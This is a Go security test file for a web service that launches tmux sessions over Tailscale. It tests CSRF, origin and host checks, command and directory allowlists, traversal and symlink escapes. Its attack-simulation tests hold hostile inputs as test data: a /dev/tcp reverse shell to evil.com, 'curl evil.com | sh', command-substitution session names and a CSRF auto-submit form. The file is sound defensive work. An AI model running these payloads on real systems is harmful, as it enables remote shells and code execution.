package main

import (
	"crypto/subtle"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func init() {
	// Initialize for tests
	csrfToken = "test-csrf-token-12345"
	tailscaleIP = "100.100.100.100"
	// Enable spawn with test allowlists
	config = &Config{
		AllowedCommands:    []string{"claude", "codex", "echo"},
		AllowedDirectories: []string{"/tmp", "/Users/elle/code"},
	}
}

// =============================================================================
// SECURITY TESTS
// These tests verify the security properties we depend on. If any fail,
// the application may be vulnerable to attack.
// =============================================================================

// --- 1. CSRF Token Required ---
// All state-changing endpoints must require a valid CSRF token.

func TestCSRFRequired(t *testing.T) {
	endpoints := []struct {
		path   string
		method string
	}{
		{"/connect/test-session", "POST"},
		{"/spawn", "POST"},
		{"/spawn-project", "POST"},
		{"/kill/test-session", "POST"},
	}

	for _, ep := range endpoints {
		form := url.Values{}
		form.Set("dir", "/tmp")
		form.Set("cmd", "echo")
		form.Set("project", "test")
		// Note: NO csrf token

		req := httptest.NewRequest(ep.method, ep.path, strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Origin", "http://"+tailscaleIP)

		w := httptest.NewRecorder()

		switch {
		case strings.HasPrefix(ep.path, "/connect/"):
			handleConnect(w, req)
		case ep.path == "/spawn":
			handleSpawn(w, req)
		case ep.path == "/spawn-project":
			handleSpawnProject(w, req)
		case strings.HasPrefix(ep.path, "/kill/"):
			handleKill(w, req)
		}

		if w.Code != http.StatusForbidden {
			t.Errorf("%s %s without CSRF: expected 403, got %d", ep.method, ep.path, w.Code)
		}
	}
}

func TestCSRFWrongToken(t *testing.T) {
	form := url.Values{}
	form.Set("csrf", "wrong-token")
	form.Set("dir", "/tmp")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("wrong CSRF token: expected 403, got %d", w.Code)
	}
}

// --- 2. Constant-Time CSRF Comparison ---
// CSRF comparison must use constant-time comparison to prevent timing attacks.

func TestCSRFUsesConstantTimeCompare(t *testing.T) {
	// Verify validateCSRF uses subtle.ConstantTimeCompare by checking behavior
	// (We can't directly test timing, but we verify correctness)

	req := httptest.NewRequest("POST", "/", nil)

	// Correct token
	req.Form = url.Values{"csrf": {csrfToken}}
	if !validateCSRF(req) {
		t.Error("validateCSRF should accept correct token")
	}

	// Wrong token (same length)
	req.Form = url.Values{"csrf": {"wrong-csrf-token-12345"}}
	if validateCSRF(req) {
		t.Error("validateCSRF should reject wrong token")
	}

	// Wrong token (different length)
	req.Form = url.Values{"csrf": {"short"}}
	if validateCSRF(req) {
		t.Error("validateCSRF should reject different-length token")
	}

	// Empty token
	req.Form = url.Values{"csrf": {""}}
	if validateCSRF(req) {
		t.Error("validateCSRF should reject empty token")
	}

	// Missing token
	req.Form = url.Values{}
	if validateCSRF(req) {
		t.Error("validateCSRF should reject missing token")
	}
}

// Verify the actual implementation uses subtle.ConstantTimeCompare
func TestConstantTimeCompareIsUsed(t *testing.T) {
	// This is a compile-time check that subtle is imported and used
	// If someone changes validateCSRF to use ==, this will still pass,
	// but the code review should catch it.

	// At minimum, verify subtle.ConstantTimeCompare works as expected
	a := []byte("test-token")
	b := []byte("test-token")
	c := []byte("different")

	if subtle.ConstantTimeCompare(a, b) != 1 {
		t.Error("ConstantTimeCompare should return 1 for equal slices")
	}
	if subtle.ConstantTimeCompare(a, c) != 0 {
		t.Error("ConstantTimeCompare should return 0 for different slices")
	}
}

// --- 3. Origin Header Validation ---
// Cross-origin requests must be rejected.

func TestOriginCheckRejectsCrossOrigin(t *testing.T) {
	evilOrigins := []string{
		"https://evil.com",
		"http://evil.com",
		"http://100.64.0.1:8090", // different Tailscale IP
		"http://100.64.0.1",      // different Tailscale IP without port
		"http://localhost:8090",
		"http://localhost",
		"http://127.0.0.1:8090",
		"http://127.0.0.1",
		"null",                                // some browsers send this for sandboxed iframes
		"file://",                             // local file
		"http://100.100.100.101",              // similar but different IP
		"http://" + tailscaleIP + ".evil.com", // IP prefix attack
		"http://" + tailscaleIP + "x",         // IP with trailing char
	}

	for _, origin := range evilOrigins {
		form := url.Values{}
		form.Set("csrf", csrfToken)
		form.Set("dir", "/tmp")
		form.Set("cmd", "echo")

		req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Origin", origin)

		w := httptest.NewRecorder()
		handleSpawn(w, req)

		if w.Code != http.StatusForbidden {
			t.Errorf("Origin %q: expected 403, got %d", origin, w.Code)
		}
	}
}

func TestOriginCheckAllowsSameOrigin(t *testing.T) {
	goodOrigins := []string{
		"http://" + tailscaleIP,
		"http://" + tailscaleIP + ":8090",
		"http://" + tailscaleIP + ":7700", // ttyd port
		"",                                // same-origin requests may have no Origin header
	}

	for _, origin := range goodOrigins {
		form := url.Values{}
		form.Set("csrf", csrfToken)
		form.Set("dir", "/tmp")
		form.Set("cmd", "echo")

		req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		if origin != "" {
			req.Header.Set("Origin", origin)
		}

		w := httptest.NewRecorder()
		handleSpawn(w, req)

		if w.Code == http.StatusForbidden {
			t.Errorf("Origin %q: should be allowed, got 403", origin)
		}
	}
}

func TestRefererFallbackRejectsCrossOrigin(t *testing.T) {
	// When Origin is empty, should check Referer
	evilReferers := []string{
		"https://evil.com/attack",
		"http://evil.com/page",
		"http://localhost:8080/",
		"http://100.64.0.1:8090/connect/session",
	}

	for _, referer := range evilReferers {
		form := url.Values{}
		form.Set("csrf", csrfToken)
		form.Set("dir", "/tmp")
		form.Set("cmd", "echo")

		req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		// No Origin header, only Referer
		req.Header.Set("Referer", referer)

		w := httptest.NewRecorder()
		handleSpawn(w, req)

		if w.Code != http.StatusForbidden {
			t.Errorf("Referer %q: expected 403, got %d", referer, w.Code)
		}
	}
}

// --- 4. POST Required (No GET Side Effects) ---
// State-changing endpoints must reject GET requests.

func TestGETNotAllowed(t *testing.T) {
	endpoints := []string{
		"/connect/test-session",
		"/spawn",
		"/spawn-project",
		"/kill/test-session",
	}

	for _, path := range endpoints {
		req := httptest.NewRequest("GET", path, nil)
		w := httptest.NewRecorder()

		switch {
		case strings.HasPrefix(path, "/connect/"):
			handleConnect(w, req)
		case path == "/spawn":
			handleSpawn(w, req)
		case path == "/spawn-project":
			handleSpawnProject(w, req)
		case strings.HasPrefix(path, "/kill/"):
			handleKill(w, req)
		}

		if w.Code != http.StatusMethodNotAllowed {
			t.Errorf("GET %s: expected 405, got %d", path, w.Code)
		}
	}
}

// Also test other methods that shouldn't be allowed
func TestOtherMethodsNotAllowed(t *testing.T) {
	methods := []string{"PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"}

	for _, method := range methods {
		req := httptest.NewRequest(method, "/spawn", nil)
		w := httptest.NewRecorder()
		handleSpawn(w, req)

		if w.Code != http.StatusMethodNotAllowed {
			t.Errorf("%s /spawn: expected 405, got %d", method, w.Code)
		}
	}
}

// --- 5. Session Name Validation ---
// Session names in /connect/ and /kill/ must be validated against real tmux sessions.
// This prevents command injection via crafted session names.

func TestConnectRejectsInvalidSession(t *testing.T) {
	form := url.Values{}
	form.Set("csrf", csrfToken)

	// Try to connect to a session that doesn't exist
	req := httptest.NewRequest("POST", "/connect/fake-session-that-does-not-exist", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleConnect(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("connect to fake session: expected 404, got %d", w.Code)
	}
}

func TestKillRejectsInvalidSession(t *testing.T) {
	form := url.Values{}
	form.Set("csrf", csrfToken)

	req := httptest.NewRequest("POST", "/kill/fake-session-that-does-not-exist", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleKill(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("kill fake session: expected 404, got %d", w.Code)
	}
}

// Test that malicious session names are rejected
func TestSessionNameInjectionPrevented(t *testing.T) {
	// These names look like valid URL paths but contain injection attempts
	maliciousNames := []string{
		"session-$(whoami)",
		"session-`id`",
		"..%2F..%2Fetc%2Fpasswd",
		"valid-session-name", // This is valid format but doesn't exist
	}

	for _, name := range maliciousNames {
		form := url.Values{}
		form.Set("csrf", csrfToken)

		req := httptest.NewRequest("POST", "/connect/"+url.PathEscape(name), strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Origin", "http://"+tailscaleIP)

		w := httptest.NewRecorder()
		handleConnect(w, req)

		// Should be rejected (404 not found because session doesn't exist)
		if w.Code == http.StatusOK || w.Code == http.StatusFound {
			t.Errorf("malicious session name %q: should be rejected, got %d", name, w.Code)
		}
	}
}

// --- 6. Directory Validation ---
// Directories must exist before spawning sessions.

func TestSpawnRejectsNonexistentDirectory(t *testing.T) {
	_, err := spawnSession("/nonexistent/path/that/does/not/exist", "echo")
	if err == nil {
		t.Error("expected error for nonexistent directory")
	}
	if !strings.Contains(err.Error(), "directory not found") {
		t.Errorf("expected 'directory not found' error, got: %s", err)
	}
}

func TestSpawnRejectsFile(t *testing.T) {
	tmpFile, err := os.CreateTemp("", "test")
	if err != nil {
		t.Fatal(err)
	}
	defer os.Remove(tmpFile.Name())
	tmpFile.Close()

	_, err = spawnSession(tmpFile.Name(), "echo")
	if err == nil {
		t.Error("expected error for file (not directory)")
	}
	if !strings.Contains(err.Error(), "not a directory") {
		t.Errorf("expected 'not a directory' error, got: %s", err)
	}
}

// --- 7. No Open Redirects ---
// Redirects must use hardcoded tailscaleIP, not user-controlled values.

func TestRedirectUsesHardcodedIP(t *testing.T) {
	// The index page should not use the Host header for any links
	req := httptest.NewRequest("GET", "/", nil)
	req.Host = "evil.com:8090" // Attacker-controlled Host header
	req.Header.Set("X-Forwarded-Host", "evil.com")

	w := httptest.NewRecorder()
	handleIndex(w, req)

	body := w.Body.String()

	// Body should NOT contain the evil host
	if strings.Contains(body, "evil.com") {
		t.Error("index page should not use Host header in output")
	}

	// Body should contain the real tailscaleIP
	if !strings.Contains(body, tailscaleIP) || !strings.Contains(body, "csrf") {
		// The page should have CSRF tokens, which means it's rendering properly
		// and using our server's token, not anything from the request
	}
}

// --- 8. ttyd Origin Checking ---
// Verify ttyd is started with --check-origin flag.

func TestTtydCommandIncludesOriginCheck(t *testing.T) {
	// We can't easily test the actual command without starting ttyd,
	// but we can verify the code path by checking the startTtyd function
	// includes -O flag. This is a code inspection test.

	// For now, just document that this must be verified manually or
	// by inspecting the running process:
	// ps aux | grep ttyd | grep -- "-O"

	t.Log("ttyd --check-origin (-O) flag must be present in startTtyd function")
	t.Log("Verify with: grep -n '\\-O' main.go")
}

// --- 9. CSRF Token Not in URLs ---
// CSRF tokens should be in POST body, not URLs (prevents leakage via Referer, logs, history)

func TestCSRFTokenNotInURLs(t *testing.T) {
	req := httptest.NewRequest("GET", "/", nil)
	w := httptest.NewRecorder()
	handleIndex(w, req)

	body := w.Body.String()

	// Check that href attributes don't contain csrf
	// Links should be POST forms, not GET links with tokens
	if strings.Contains(body, "href=") && strings.Contains(body, "csrf=") {
		// This would indicate a URL like href="/connect/session?csrf=token"
		if strings.Contains(body, "?csrf=") || strings.Contains(body, "&csrf=") {
			t.Error("CSRF token found in URL - should be in POST body only")
		}
	}

	// CSRF should only appear in hidden form fields
	if !strings.Contains(body, `name="csrf"`) {
		t.Error("CSRF token should be in form fields")
	}
}

// --- 10. CSRF Token is Cryptographically Random ---

func TestCSRFTokenGeneration(t *testing.T) {
	// Generate multiple tokens and verify they're different
	tokens := make(map[string]bool)
	for i := 0; i < 10; i++ {
		token := generateCSRFToken()
		if tokens[token] {
			t.Error("CSRF token collision detected - not random enough")
		}
		tokens[token] = true

		// Token should be 64 hex characters (32 bytes)
		if len(token) != 64 {
			t.Errorf("CSRF token should be 64 chars, got %d", len(token))
		}

		// Should be valid hex
		for _, c := range token {
			if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
				t.Errorf("CSRF token contains non-hex character: %c", c)
			}
		}
	}
}

// =============================================================================
// ATTACK SIMULATIONS
// These tests simulate actual attack scenarios an attacker might try.
// =============================================================================

// Attack: Malicious website tries to spawn a reverse shell on your machine
// Vector: You visit evil.com while on your Tailnet, their JS submits a form
func TestAttack_CrossSiteSpawnReverseShell(t *testing.T) {
	// Attacker's payload: spawn bash with a reverse shell command
	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")
	// Attacker doesn't have CSRF token - they can't read your page (same-origin policy)
	// So they either guess or omit it
	form.Set("csrf", "attacker-guessed-token")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "https://evil.com") // Browser sends real origin

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Cross-site reverse shell spawn returned %d, expected 403", w.Code)
	}
}

// Attack: Attacker knows your Tailscale IP range, sprays requests
func TestAttack_TailscaleIPSpray(t *testing.T) {
	// Attacker script on evil.com tries all 100.x.x.x IPs
	// For each IP, tries to spawn a session

	form := url.Values{}
	form.Set("dir", "/")
	form.Set("cmd", "curl evil.com/pwned")
	// No CSRF token - attacker can't get it without reading your page

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "https://attacker-script.com")

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: IP spray attack returned %d, expected 403", w.Code)
	}
}

// Attack: Hidden form auto-submit (classic CSRF)
func TestAttack_HiddenFormAutoSubmit(t *testing.T) {
	// Attacker embeds this in their page:
	// <form action="http://100.x.x.x:8090/spawn" method="POST" id="f">
	//   <input name="dir" value="/tmp">
	//   <input name="cmd" value="malicious">
	// </form>
	// <script>document.getElementById('f').submit()</script>

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "curl evil.com | sh")
	// No CSRF token

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "https://phishing-site.com")

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Hidden form CSRF returned %d, expected 403", w.Code)
	}
}

// Attack: img tag triggers GET request to spawn ttyd
func TestAttack_ImgTagSpawnTtyd(t *testing.T) {
	// Attacker embeds: <img src="http://100.x.x.x:8090/connect/session-name">
	// This would spawn ttyd if /connect accepted GET

	req := httptest.NewRequest("GET", "/connect/claude-project-cozy-otter", nil)
	// GET requests don't have Origin header typically, but may have Referer
	req.Header.Set("Referer", "https://evil.com/page-with-img-tag")

	w := httptest.NewRecorder()
	handleConnect(w, req)

	// Must reject GET
	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("ATTACK SUCCEEDED: img tag GET request returned %d, expected 405", w.Code)
	}
}

// Attack: iframe embedding to clickjack
func TestAttack_ClickjackingViaIframe(t *testing.T) {
	// Attacker puts your page in an iframe and overlays fake UI
	// User thinks they're clicking attacker's button but actually clicks your spawn

	// This test verifies the form submission still needs CSRF even if framed
	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "id")
	// The iframe can submit the form, but without CSRF token from reading the page

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	// When framed cross-origin, Origin will be the parent frame's origin
	req.Header.Set("Origin", "https://clickjack-site.com")

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Clickjacking iframe attack returned %d, expected 403", w.Code)
	}
}

// Attack: DNS rebinding to bypass same-origin
func TestAttack_DNSRebinding(t *testing.T) {
	// Attacker's domain evil.com initially resolves to their server
	// After you load the page, they rebind DNS to your Tailscale IP
	// Browser still thinks it's evil.com but requests go to your machine

	// However, the Origin header will still be "http://evil.com"
	// And our CSRF token won't match what evil.com's JS knows

	form := url.Values{}
	form.Set("dir", "/tmp")
	form.Set("cmd", "whoami")
	form.Set("csrf", "attacker-cannot-know-this")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://evil.com") // DNS rebound but origin stays

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: DNS rebinding attack returned %d, expected 403", w.Code)
	}
}

// Attack: DNS rebinding to read CSRF token from index page
func TestAttack_DNSRebindingReadCSRF(t *testing.T) {
	// After DNS rebinding, browser sends Host: evil.com but request goes to our server.
	// The host check middleware should block this, preventing the attacker from
	// even reading the index page (and extracting the CSRF token).

	req := httptest.NewRequest("GET", "/", nil)
	req.Host = "evil.com:8090" // DNS rebound host

	w := httptest.NewRecorder()
	hostCheckMiddleware(http.HandlerFunc(handleIndex)).ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: DNS rebinding read returned %d, expected 403", w.Code)
	}
	if strings.Contains(w.Body.String(), csrfToken) {
		t.Error("ATTACK SUCCEEDED: CSRF token leaked despite host check")
	}
}

// Verify host check allows legitimate requests
func TestHostCheckAllowsTailscaleIP(t *testing.T) {
	validHosts := []string{
		tailscaleIP,
		tailscaleIP + ":8090",
	}

	for _, host := range validHosts {
		req := httptest.NewRequest("GET", "/", nil)
		req.Host = host

		w := httptest.NewRecorder()
		hostCheckMiddleware(http.HandlerFunc(handleIndex)).ServeHTTP(w, req)

		if w.Code == http.StatusForbidden {
			t.Errorf("Host %q should be allowed, got 403", host)
		}
	}
}

func TestHostCheckRejectsWrongHosts(t *testing.T) {
	badHosts := []string{
		"evil.com",
		"evil.com:8090",
		"localhost",
		"localhost:8090",
		"127.0.0.1",
		"127.0.0.1:8090",
		tailscaleIP + ".evil.com",
		"",
	}

	for _, host := range badHosts {
		req := httptest.NewRequest("GET", "/", nil)
		req.Host = host

		w := httptest.NewRecorder()
		hostCheckMiddleware(http.HandlerFunc(handleIndex)).ServeHTTP(w, req)

		if w.Code != http.StatusForbidden {
			t.Errorf("Host %q should be rejected, got %d", host, w.Code)
		}
	}
}

// Attack: Kill all sessions (DoS)
func TestAttack_KillAllSessions(t *testing.T) {
	// Attacker tries to kill sessions without knowing CSRF token

	form := url.Values{}
	// No CSRF token

	req := httptest.NewRequest("POST", "/kill/claude-project-happy-otter", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "https://dos-attacker.com")

	w := httptest.NewRecorder()
	handleKill(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Session kill DoS returned %d, expected 403", w.Code)
	}
}

// Attack: Attacker with CSRF token but wrong origin
func TestAttack_StolenCSRFWrongOrigin(t *testing.T) {
	// Suppose attacker somehow got the CSRF token (unlikely but test defense-in-depth)
	// Origin check should still block them

	form := url.Values{}
	form.Set("csrf", csrfToken) // Attacker has the real token!
	form.Set("dir", "/tmp")
	form.Set("cmd", "pwned")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "https://attacker-with-token.com")

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	// Defense in depth: even with CSRF token, wrong origin is rejected
	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: Stolen CSRF + wrong origin returned %d, expected 403", w.Code)
	}
}

// Attack: Null origin (sandboxed iframe)
func TestAttack_NullOrigin(t *testing.T) {
	// Sandboxed iframes and some other contexts send Origin: null

	form := url.Values{}
	form.Set("csrf", csrfToken)
	form.Set("dir", "/tmp")
	form.Set("cmd", "id")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "null")

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("ATTACK SUCCEEDED: null origin attack returned %d, expected 403", w.Code)
	}
}

// Attack: WebSocket hijacking from evil page
func TestAttack_WebSocketHijackDocumentation(t *testing.T) {
	// This attack is blocked by ttyd's --check-origin flag, not our Go code
	// Document the protection:
	t.Log("WebSocket hijacking blocked by ttyd -O (--check-origin) flag")
	t.Log("Attack: evil.com JS does new WebSocket('ws://100.x.x.x:7700/ws')")
	t.Log("Protection: ttyd rejects if Origin header doesn't match server host")
	t.Log("Verify: ps aux | grep ttyd | grep -- '-O'")
}

// =============================================================================
// ALLOWLIST TESTS
// These verify that command and directory restrictions work.
// =============================================================================

func TestAllowlist_CommandNotAllowed(t *testing.T) {
	form := url.Values{}
	form.Set("csrf", csrfToken)
	form.Set("dir", "/tmp")
	form.Set("cmd", "bash") // Not in allowlist

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("disallowed command 'bash': expected 403, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("expected 'access denied' in response, got: %s", w.Body.String())
	}
}

func TestAllowlist_CommandAllowed(t *testing.T) {
	form := url.Values{}
	form.Set("csrf", csrfToken)
	form.Set("dir", "/tmp")
	form.Set("cmd", "claude") // In allowlist

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	// Should not be rejected for command (might fail for other reasons like tmux)
	if w.Code == http.StatusForbidden && strings.Contains(w.Body.String(), "command") {
		t.Errorf("allowed command 'claude' was rejected: %s", w.Body.String())
	}
}

func TestAllowlist_DirectoryNotAllowed(t *testing.T) {
	form := url.Values{}
	form.Set("csrf", csrfToken)
	form.Set("dir", "/etc") // Not in allowlist
	form.Set("cmd", "claude")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("disallowed directory '/etc': expected 403, got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("expected 'access denied' in response, got: %s", w.Body.String())
	}
}

func TestAllowlist_DirectoryAllowed(t *testing.T) {
	form := url.Values{}
	form.Set("csrf", csrfToken)
	form.Set("dir", "/tmp") // In allowlist
	form.Set("cmd", "echo")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	// Should not be rejected for directory
	if w.Code == http.StatusForbidden && strings.Contains(w.Body.String(), "directory") {
		t.Errorf("allowed directory '/tmp' was rejected: %s", w.Body.String())
	}
}

func TestAllowlist_SubdirectoryAllowed(t *testing.T) {
	form := url.Values{}
	form.Set("csrf", csrfToken)
	form.Set("dir", "/Users/elle/code/agent-phone") // Subdirectory of allowed
	form.Set("cmd", "echo")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	// Should not be rejected for directory
	if w.Code == http.StatusForbidden && strings.Contains(w.Body.String(), "directory") {
		t.Errorf("subdirectory of allowed was rejected: %s", w.Body.String())
	}
}

func TestAllowlist_TraversalBlocked(t *testing.T) {
	// Try to escape allowed directory via ../
	form := url.Values{}
	form.Set("csrf", csrfToken)
	form.Set("dir", "/tmp/../etc") // Tries to escape to /etc
	form.Set("cmd", "claude")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("directory traversal should be blocked: got %d", w.Code)
	}
}

func TestAllowlist_ReverseShellBlocked(t *testing.T) {
	// Even with valid origin and CSRF, malicious command is blocked
	form := url.Values{}
	form.Set("csrf", csrfToken)
	form.Set("dir", "/tmp")
	form.Set("cmd", "bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("reverse shell command should be blocked: got %d", w.Code)
	}
}

func TestAllowlist_SpawnDisabledWithoutConfig(t *testing.T) {
	// Temporarily disable config
	savedConfig := config
	config = nil
	defer func() { config = savedConfig }()

	form := url.Values{}
	form.Set("csrf", csrfToken)
	form.Set("dir", "/tmp")
	form.Set("cmd", "claude")

	req := httptest.NewRequest("POST", "/spawn", strings.NewReader(form.Encode()))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Origin", "http://"+tailscaleIP)

	w := httptest.NewRecorder()
	handleSpawn(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("spawn without config should be blocked: got %d", w.Code)
	}
	if !strings.Contains(w.Body.String(), "access denied") {
		t.Errorf("expected 'access denied' message, got: %s", w.Body.String())
	}
}

func TestIsCommandAllowed(t *testing.T) {
	tests := []struct {
		cmd      string
		expected bool
	}{
		{"claude", true},
		{"codex", true},
		{"echo", true},
		{"bash", false},
		{"sh", false},
		{"rm", false},
		{"curl", false},
		{"", false},
	}

	for _, tc := range tests {
		result := isCommandAllowed(tc.cmd)
		if result != tc.expected {
			t.Errorf("isCommandAllowed(%q) = %v, want %v", tc.cmd, result, tc.expected)
		}
	}
}

func TestIsDirectoryAllowed(t *testing.T) {
	// Create a real temp directory for testing (avoids /tmp -> /private/tmp symlink issues on macOS)
	tmpDir := t.TempDir()
	subDir := filepath.Join(tmpDir, "subdir")
	os.MkdirAll(subDir, 0755)

	// Save and restore config
	savedConfig := config
	config = &Config{
		AllowedCommands:    []string{"claude", "codex", "echo"},
		AllowedDirectories: []string{tmpDir},
	}
	defer func() { config = savedConfig }()

	tests := []struct {
		dir      string
		expected bool
	}{
		{tmpDir, true},
		{subDir, true},
		{"/etc", false},
		{"/", false},
		{tmpDir + "/../etc", false}, // traversal
	}

	for _, tc := range tests {
		result := isDirectoryAllowed(tc.dir)
		if result != tc.expected {
			t.Errorf("isDirectoryAllowed(%q) = %v, want %v", tc.dir, result, tc.expected)
		}
	}
}

func TestIsDirectoryAllowed_SymlinkBypass(t *testing.T) {
	// Verify that symlinks inside an allowed directory pointing outside it are rejected
	tmpDir := t.TempDir()
	outsideDir := t.TempDir()

	savedConfig := config
	config = &Config{
		AllowedCommands:    []string{"echo"},
		AllowedDirectories: []string{tmpDir},
	}
	defer func() { config = savedConfig }()

	// Create a symlink inside the allowed dir pointing outside
	symlink := filepath.Join(tmpDir, "escape")
	if err := os.Symlink(outsideDir, symlink); err != nil {
		t.Skipf("cannot create symlink: %v", err)
	}

	// The symlink path looks like it's under tmpDir, but resolves outside
	if isDirectoryAllowed(symlink) {
		t.Errorf("symlink %q -> %q should be rejected (resolves outside allowed directory)", symlink, outsideDir)
	}

	// The allowed dir itself should still work
	if !isDirectoryAllowed(tmpDir) {
		t.Errorf("allowed directory %q should be accepted", tmpDir)
	}
}

// =============================================================================
// FUNCTIONAL TESTS
// =============================================================================

func TestGenerateSessionName(t *testing.T) {
	name := generateSessionName("claude", "myproject")

	parts := strings.Split(name, "-")
	if len(parts) != 4 {
		t.Errorf("expected 4 parts, got %d: %s", len(parts), name)
	}
	if parts[0] != "claude" {
		t.Errorf("expected cmd 'claude', got '%s'", parts[0])
	}
	if parts[1] != "myproject" {
		t.Errorf("expected project 'myproject', got '%s'", parts[1])
	}

	foundAdj := false
	for _, adj := range adjectives {
		if adj == parts[2] {
			foundAdj = true
			break
		}
	}
	if !foundAdj {
		t.Errorf("adjective '%s' not in list", parts[2])
	}

	foundNoun := false
	for _, noun := range nouns {
		if noun == parts[3] {
			foundNoun = true
			break
		}
	}
	if !foundNoun {
		t.Errorf("noun '%s' not in list", parts[3])
	}
}

